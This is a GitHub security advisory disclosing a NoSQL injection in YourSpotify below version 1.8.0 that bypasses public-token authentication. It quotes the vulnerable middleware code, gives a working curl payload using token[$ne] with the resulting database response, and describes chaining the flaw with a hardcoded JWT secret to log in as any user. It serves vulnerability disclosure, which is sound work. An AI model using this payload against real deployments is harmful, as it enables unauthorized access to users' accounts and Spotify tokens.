# NoSQL Injection Leading to Authentication Bypass

Moderate

[Yooooomi](/Yooooomi)

GHSA-c8wf-wcjc-2pvm

## Package

No package listed

## Affected versions

<1.8.0

## Patched versions

1.8.0

## Description

### Summary

YourSpotify version <1.8.0 is vulnerable to NoSQL injection in the public access token processing logic. Attackers can fully bypass the public token authentication mechanism, regardless if a public token has been generated before or not, without any user interaction or prerequisite knowledge.

The current CVSS score of this advisory was scored as if the public token mechanism was working as intended and only granting basic read access to YourSpotify data. It is important to note that this vulnerability can be combined with [GHSA-3782-758f-mj85](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-3782-758f-mj85) to retrieve Spotify API access tokens without any authentication and with [GHSA-gvcr-g265-j827](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-gvcr-g265-j827) to obtain a full authentication bypass and log in as any YourSpotify user without any prerequisite knowledge. In that case, the combined vulnerability chain can be scored as [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N), resulting in a total score of **9.1 - Critical**.

### Details

The public access token verification middleware used in YourSpotify is vulnerable to NoSQL injection. Normally, the public token can be used by appending the `token` parameter to the query parameters of any request, for example:

```
curl "http://backend.yourspotify.internal:8080/me?token=6f4f79d6-b957-4487-8d97-23569b6e7935"
```

The parameter is evaluated by the `baselogged` middleware in `server/src/tools/middleware.ts`. In this middleware, the `token` value is extracted out of the `req.query` object and directly passed into the `getUserFromField` function as shown below:

[your\_spotify/server/src/tools/middleware.ts](https://github.com/Yooooomi/your_spotify/blob/b205bfb606fbc72f41eb79fb6fcb9a230bf8819d/server/src/tools/middleware.ts#L40-L53)

Lines 40 to 53
in
[b205bfb](/Yooooomi/your_spotify/commit/b205bfb606fbc72f41eb79fb6fcb9a230bf8819d)

|  | const baselogged = async (req: Request, useQueryToken = false) => { |
| --- | --- |
|  | const auth = req.cookies.token; |
|  |  |
|  | if (!auth && useQueryToken) { |
|  | const { token } = req.query; |
|  | if (!token) { |
|  | return null; |
|  | } |
|  | const user = await getUserFromField('publicToken', token, false); |
|  | if (!user) { |
|  | return null; |
|  | } |
|  | return user; |
|  | } |

The `getUserFromField` function is located in the file `server/src/database/queries/user.ts`. This function directly passes the `value` parameter (which is the `token` parameter directly from the request) into a MongoDB query, as shown below:

[your\_spotify/server/src/database/queries/user.ts](https://github.com/Yooooomi/your_spotify/blob/b205bfb606fbc72f41eb79fb6fcb9a230bf8819d/server/src/database/queries/user.ts#L13-L24)

Lines 13 to 24
in
[b205bfb](/Yooooomi/your_spotify/commit/b205bfb606fbc72f41eb79fb6fcb9a230bf8819d)

|  | export const getUserFromField = async <F extends keyof User>( |
| --- | --- |
|  | field: F, |
|  | value: User[F], |
|  | crash = true, |
|  | ) => { |
|  | const user = UserModel.findOne({ [field]: value }, '-tracks'); |
|  |  |
|  | if (!user && crash) { |
|  | throw new NoResult(); |
|  | } |
|  | return user; |
|  | }; |

Express allows creating objects out of query parameters by using the `?param[key]=value` syntax. For example, this query string would create the following object in `req.query`:

```
{
    param: {
        key: "value"
    }
}
```

This can be exploited by passing a NoSQL query operator in the `token` parameter to make the user query always return a user.

For example, the following request can be used to bypass public access token verification at the `/me` endpoint:

```
curl -g 'http://backend.yourspotify.internal:8080/me?token[$ne]=DOESNOTEXIST'
```

Using Mongoose debug logging, the resulting request to the database can be identified as the following:

```
users.findOne({ publicToken: { '$ne': 'DOESNOTEXIST' } }, { projection: { tracks: 0 } })
```

As this query tries to find a user whose public token is *not equal* to `DOESNOTEXIST`, it will always return a valid user, which causes YourSpotify to acccept this request as authenticated with a public token for that user. If multiple users with different access tokens exist, a similar technique using the `$regex` query operator can be used to make the query return a different user.

This technique can also be used for all other endpoints accepting public tokens, such as `/accounts`. Access to `/accounts` allows an attacker to obtain the `id` of all users. This `id` can then be used in conjunction with the hardcoded JWT secret vulnerability [GHSA-gvcr-g265-j827](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-gvcr-g265-j827) to fully log in as any user.

### Proof of Concept

The following example `curl` command sends a request with a `token` parameter containing a NoSQL injection payload to the `/me` endpoint:

```
curl -g 'http://backend.yourspotify.internal:8080/me?token[$ne]=DOESNOTEXIST'
```

The (formatted and redacted) JSON response to this command is shown below:

```
{
  "status": true,
  "user": {
    "settings": {
      "historyLine": false,
      "preferredStatsPeriod": "month",
      "nbElements": 10,
      "metricUsed": "number",
      "darkMode": "follow",
      "blacklistedArtists": []
    },
    "_id": "65ce739fca48dd258976a58a",
    "username": "<REDACTED>",
    "admin": true,
    "spotifyId": "<REDACTED>",
    "expiresIn": 1708283396572,
    "accessToken": "<REDACTED>",
    "refreshToken": "<REDACTED>",
    "lastTimestamp": 1708274387373,
    "lastImport": null,
    "publicToken": "6f4f79d6-b957-4487-8d97-23569b6e7935",
    "__v": 0,
    "firstListenedAt": "2024-02-15T15:03:15.946Z",
    "id": "65ce739fca48dd258976a58a"
  }
}
```

This response shows that the NoSQL injection payload in the `token` parameter completely circumvented the public access token mechanism.

### Impact

This vulnerability allows an attacker to fully bypass the public token authentication mechanism, regardless if a public token has been generated before or not, without any user interaction or prerequisite knowledge.

This technique can also be used for all other endpoints accepting public tokens, such as `/accounts`. Access to `/accounts` allows an attacker to obtain the `id` of all users. This `id` can then be used in conjunction with the hardcoded JWT secret vulnerability [GHSA-gvcr-g265-j827](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-gvcr-g265-j827) to fully log in as any user.
